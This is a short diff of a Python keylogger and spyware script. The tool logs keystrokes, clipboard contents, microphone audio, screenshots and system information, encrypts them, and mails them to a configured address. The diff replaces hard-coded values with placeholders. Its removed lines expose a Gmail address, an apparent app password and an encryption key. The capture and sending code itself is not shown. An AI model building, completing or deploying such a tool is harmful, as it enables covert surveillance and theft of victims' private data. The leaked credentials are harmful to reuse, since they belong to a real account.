@@ -33,9 +33,9 @@ from PIL import ImageGrab
 
 keys_information = 'key_log.txt'
 system_information ='systeminfo.txt'
-email_address = 'testpythoncodee123@gmail.com'
+email_address = 'Email to login'
 clipboard_information = 'clipboard.txt'
-password = 'sayy dwry ejso vbsz'
+password = 'ineert Pass'
 audio_information = "audio.wav"
 microphone_time = 10
 screenshott = 'screenshot.png'
@@ -46,9 +46,9 @@ keys_information_e = 'e_key_log.txt'
 system_information_e = 'esystem_information.txt'
 clipboard_information_e = 'e_clipboard.txt'
 
-key = 'JsKgtdbs4bvkzAHHqZ65OsAJsRVFWScWU7XLLBL9z_w='
+#key = 'For Encryption Part'
 
-toaddr = 'testpythoncodee123@gmail.com'
+toaddr = 'Insert Email'
 
 username = getpass.getuser()
 
@@ -191,6 +191,7 @@ while number_of_iterations < number_of_iterations_end:
 
     #IF escape key is hit exit
     def on_release(key):
+        #For testing purposes
         if key == Key.esc:
             return False
         if currentTime > stoppingTim:
